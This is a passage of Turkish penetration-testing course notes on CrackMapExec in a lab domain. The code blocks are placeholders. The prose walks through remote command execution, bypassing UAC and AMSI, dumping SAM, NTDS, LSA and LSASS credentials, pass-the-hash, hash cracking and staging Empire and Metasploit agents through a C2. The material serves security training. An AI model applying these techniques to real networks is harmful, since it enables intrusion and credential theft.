Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

